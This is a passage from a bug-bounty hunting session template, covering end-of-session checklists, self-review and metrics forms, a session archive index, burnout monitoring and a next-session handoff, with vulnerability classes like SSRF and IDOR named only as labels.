END-OF-SESSION CHECKLIST:
  - [ ] All findings logged
  - [ ] All findings killed that should be killed
  - [ ] Evidence packages started/updated
  - [ ] Coverage grid updated
  - [ ] Decision journal completed
  - [ ] Time log completed
  - [ ] Account sessions closed (logged out)
  - [ ] Tokens rotated (if sensitive)
  - [ ] Tools closed (Burp, Collaborator, interact.sh)
  - [ ] Memory files updated (target-registry, lessons-log)
  - [ ] Session file saved to archive
```

### Session Results Summary

```
FINDINGS THIS SESSION:
  - Confirmed: [N]
  - Killed: [N]
  - In progress: [N]

FINDINGS ACCUMULATED (ALL SESSIONS):
  - Total confirmed: [N]
  - Total killed: [N]
  - Total submitted: [N]
  - Total paid: [N]

BEST FINDING THIS SESSION:
  - [Finding description]
  - Estimated CVSS: [score]
  - Estimated payout: [$]
```

### Save Session

At the end of every session, save this file to:
`sessions/[target]-[YYYY-MM-DD]-session[N].md`

This file will be used as the starting point for the next session's
hunt-session.md.

---

## 12. Post-Session Review

### 12.1 Self-Review

Complete within 15 minutes of session end:

```
SESSION SELF-REVIEW: 2026-06-06

Productivity Score: [1-10]
What made it productive/unproductive:
[Notes]

Time Management Score: [1-10]
What I spent too much time on:
[Notes]

What I should have spent more time on:
[Notes]

Best Decision:
[Decision and why it was good]

Worst Decision:
[Decision and why it was bad]

Key Lesson:
[One-sentence lesson learned]

Skills Used:
[list]

Skills to Improve:
[list]

Mood: [Energized / Neutral / Frustrated]

```
PHYSICAL CHECK-IN:
  Hours slept last night: [N]
  Caffeine today: [N cups]
  Water intake: [Low / Medium / High]
  Break taken: [Yes / No]
  Eye strain: [None / Mild / High]
  Fingers/hands: [Fine / Sore / Painful]
  Overall: [Ready to continue / Need to stop / Push through]
```

Next Session Focus: [What to prioritize next time]
Priorities:
  1. [Primary priority]
  2. [Secondary priority]
  3. [Tertiary priority]

Approach for next session:
- Continue from where we left off: [Yes/No — justify]
- Switch to different attack surface: [Yes/No — justify]
- Spend more time on: [which areas]
- Spend less time on: [which areas]
```

### 12.2 Key Metrics Tracking

Track key performance metrics per session:

```
SESSION METRICS:
  Requests sent: [N]
  Endpoints tested: [N]
  Findings found: [N]
  Findings killed: [N]
  Evidence packages created: [N]
  Tools used: [list]
  Rate limits hit: [N]
  WAF blocks triggered: [N]
  Callbacks received (SSRF/blind XSS): [N]
```

### 12.3 Lessons Applied From Previous Sessions

Before each session, review lessons from the previous session and track if they
were applied:

```
LESSONS FROM PREVIOUS SESSION (YYYY-MM-DD):
  1. [Lesson from prev session] — [Applied / Not applied]
  2. [Lesson from prev session] — [Applied / Not applied]
  3. [Lesson from prev session] — [Applied / Not applied]

NEW LESSONS THIS SESSION:
  1. [New lesson]
  2. [New lesson]
  3. [New lesson]
```

### 12.4 Session Energy & Focus Log

Track your energy and focus throughout the session to identify optimal working patterns:

```
| Time Block | Energy Level (1-10) | Focus Level (1-10) | Activity | Notes |
|------------|--------------------|--------------------|----------|-------|
| 0:00-0:30 | 9 | 9 | SSRF testing | High energy, good focus |
| 0:30-1:00 | 8 | 7 | JWT testing | Good but getting tired |
| 1:00-1:30 | 6 | 6 | IDOR testing | Mid-session slump |
| 1:30-2:00 | 7 | 8 | Evidence capture | Break helped |
```

Pattern observations:
- Best time for complex tasks: [First 30 min]
- Best time for simple tasks: [Last 30 min]
- Need break around: [60 min mark]

### 12.5 Post-Session Processing Checklist

Run this checklist after every session:

```
SESSION: 2026-06-07

AFTER-SESSION CHECKS:
[x] 1. Save this session file with a unique name
[ ] 2. Transfer validated findings to the target-registry
[ ] 3. Update technique-library with new techniques discovered
[ ] 4. Log lessons learned to lessons-log.md
[ ] 5. Update active-target.md with new findings and progress
[ ] 6. Update chain-primitives with any new primitives discovered
[ ] 7. Archive old session files (keep last 3)
[ ] 8. Rotate test accounts (change passwords)
[ ] 9. Clear browser sessions and cookies
[ ] 10. Check for any rate-limit cooldown that needs to expire
[ ] 11. Review evidence screenshots for PII leaks
[ ] 12. Update the session coverage table
[ ] 13. Set hunting priorities for next session
[ ] 14. Review always-rejected list before writing any report

NEXT SESSION QUICK-START:
- Target: [target name]
- Priority bugs: [bug classes to focus on]
- Primitive chain to explore: [chain to investigate]
- Estimated duration: [2h / 3h / 4h]
```

### 12.6 Session Archive Index

Keep an index of all completed sessions for quick reference:

```
SESSION ARCHIVE:

2026-06-07 - [Target] - [Summary: SSRF found, JWT no vuln, IDOR ATO confirmed]
  File: context/2026-06-07-hunt-session.md
  Findings: SSRF (High), IDOR->ATO (Critical)
  Time: 2.5h

2026-06-06 - [Target] - [Summary: Recon, subdomain enum, first contact]
  File: context/2026-06-06-hunt-session.md
  Findings: None (recon only)
  Time: 1.5h

TOTAL HUNTING TIME: [N] hours
TOTAL FINDINGS: [N]
FINDINGS PER HOUR: [N]
```

### 12.7 Hunting Burnout Prevention

Bug bounty hunting is mentally demanding. Track your state to prevent burnout:

```
SESSION FATIGUE MONITOR:
  Session number this week: [N]
  Hours hunted this week: [N]
  Days hunted in a row: [N]
  Finding quality trend: [Up / Flat / Down]
  Motivation level (1-10): [N]
  Last full day off: [YYYY-MM-DD]
  
  BURNOUT WARNING SIGNS:
  [ ] Skipping evidence capture ("I'll do it later")
  [ ] Skipping validation gates ("It's probably valid")
  [ ] Lower complexity testing (only doing easy checks)
  [ ] Impatience with tools loading
  [ ] Skipping the pre-hunt learning phase
  [ ] Multiple sessions with zero findings
  
  ACTION IF 2+ WARNING SIGNS:
  - Take a full day off
  - Review your own past successful findings for confidence
  - Study a new technique (not testing, just reading)
  - Reduce session length to 1h
  - Consider switching targets
```

### 12.8 Template for Next Session

Copy this section to the next session's hunt-session.md file:

```
NEXT SESSION START POINT:
TARGET: [domain]
NEXT PHASE: [Phase N]
NEXT OBJECTIVES:
  1. [Objective 1]
  2. [Objective 2]
  3. [Objective 3]

ACCOUNTS NEED (re-create if expired):
  - Account A: [email]
  - Account B: [email]

PENDING INVESTIGATIONS CONTINUED:
  [List from investigation log]

TOOLS TO LOAD:
  - [ ] Same as this session
  - [ ] Additional tools needed: [list]
```

---

## Hunt Session — Usage Notes

- Start a new hunt-session.md at the beginning of every hunting session
- Archive the previous session to sessions/[target]-[date]-session[N].md
- Update in real-time during hunting (bullet points are fine)
- Focus on tracking what matters: what you tested, what you found, what you decided
- Do not let logging slow down hunting — use shorthand during active testing
- Expand notes during natural breaks (SSRF callback waiting, tool loading, etc.)
- Complete the post-session review immediately after the session ends
- The next session starts by loading the saved previous session for context
